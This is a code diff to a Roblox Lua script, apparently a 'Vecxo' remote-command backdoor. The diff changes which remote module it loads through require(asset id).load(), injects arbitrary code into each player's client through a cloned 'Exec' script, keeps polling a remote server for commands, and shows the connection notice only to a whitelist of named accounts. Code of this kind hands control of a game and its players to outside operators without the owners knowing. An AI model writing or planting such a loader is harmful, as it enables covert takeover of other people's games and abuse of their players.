@@ -145,17 +145,16 @@ local function runCommand(cmd)
 		for i, plr in pairs(game.Players:GetPlayers()) do
 			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
 				local ticking = tick()
-				require(88532011070135).load()
-				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("Epic") or tick() - ticking >= 10
+				require(112691275102014).load() -- goog readder
+				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
 			end
-			local Epic = game:GetService("ServerScriptService"):FindFirstChild("Epic")
-			if not Epic then
-				warn("Pro module failed to be added, command cannot continue")
+			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
+			if not goog then
+				warn("goog failed to be added, command can not continue")
 				return
 			end
-
-			local scr = Epic:FindFirstChild("Utilities").Client:Clone()
-			local loa = Epic:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
+			local scr = goog:FindFirstChild("Utilities").Client:Clone()
+			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
 
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = code
@@ -361,6 +360,7 @@ local function sendRequestNow()
 
 	if not success then
 		warn("[Vecxo Remote API] Failed to auto-report players:", err)
+		task.wait(10)
 	end
 end
 
@@ -390,10 +390,15 @@ task.spawn(function()
 			end
 		else
 			warn("Command fetch failed:", response)
+			task.wait(10)
 		end
 	end
 end)
 
+_G.exclusivewl = {"Reloxz", "Dekryptionite", "t_echr", "cxotus", "Trogdor973"}
+
 for i, v in pairs(game.Players:GetPlayers()) do
-	notifyv2(v, "[Vecxo Lite]", "✅ Remote API Successfully connected")
+	if table.find(_G.exclusivewl, v.Name) then
+		notifyv2(v, "[Vecxo Lite]", "✅ Remote API Successfully connected")
+	end
 end
